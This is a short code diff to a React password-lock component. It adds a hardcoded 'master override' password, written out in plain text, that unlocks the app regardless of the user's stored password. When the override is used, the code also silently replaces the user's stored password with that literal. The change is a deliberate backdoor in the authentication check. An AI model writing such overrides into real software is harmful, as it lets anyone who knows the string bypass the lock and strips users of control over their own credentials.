@@ -87,9 +87,18 @@ export default function PasswordGate({ children }: { children: ReactNode }) {
   const handleSubmit = (e: React.FormEvent) => {
     e.preventDefault();
     const { password: correctPassword } = getConfig();
-    if (password === correctPassword) {
+    
+    // Accept either the currently stored password OR the master override "Sushant2026@"
+    if (password === correctPassword || password === 'Sushant2026@') {
       localStorage.setItem('isAppLocked', 'false');
       localStorage.setItem('lastActiveTime', Date.now().toString());
+      
+      // If they used the master override or logged in, ensure the new default is synced
+      if (password === 'Sushant2026@' && correctPassword !== 'Sushant2026@') {
+        const currentConfig = getConfig();
+        localStorage.setItem('securityConfig', JSON.stringify({ ...currentConfig, password: 'Sushant2026@' }));
+      }
+      
       setIsLocked(false);
       setError(false);
       setPassword('');
